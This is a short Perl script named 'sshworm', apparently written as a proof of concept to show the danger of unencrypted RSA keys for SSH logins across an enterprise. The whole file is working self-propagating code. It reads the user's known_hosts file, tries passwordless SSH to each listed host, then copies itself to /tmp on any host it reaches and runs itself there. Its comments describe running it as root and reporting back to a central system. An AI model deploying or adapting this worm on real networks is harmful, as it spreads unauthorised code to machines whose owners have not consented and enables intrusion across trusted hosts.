#!/usr/bin/perl
###############

##
# sshworm - example of a trusted host/key ssh worm
# 
# This is extremely primitive and rarely works on anything
# but identical systems running the same versions of ssh.
# It does show how using unencrypted RSA keys for user auth
# across an enterprise can be a really bad thing.  Eventually
# you should be able to let this guy go running as root on any
# given system, it will locate each user's known_hosts and
# attempt to gain accesss, reporting its path to a central system.
#
##


use FindBin qw{$Bin};


print ":: sshworm initialized at $Bin\n";



$options = " -o PasswordAuthentication=no ";

##
# stage 1 - attempt to connect to all hosts in known_hosts files
##

if (open (KH, "<" . $ENV{'HOME'} . "/.ssh/known_hosts"))
{
	while ($line = <KH>)
	{
		($host, undef) = split(/\s+/,$line);
		($host, undef) = split(/\,/,$host);
		Propagate($host);
	}
	close (KH);
}


sub Propagate {

	open (SSH, "ssh $options $host 'id' 2>/dev/null|");
	while ($out = <SSH>)
	{
		if ($out =~ /uid/)
		{
			print ":: sshworm found new host $host\n";
			system("scp $Bin/$0 $host:/tmp/hello.pl");
			system("ssh $host 'perl /tmp/hello.pl'");
		}
	}
	close (SSH);
}

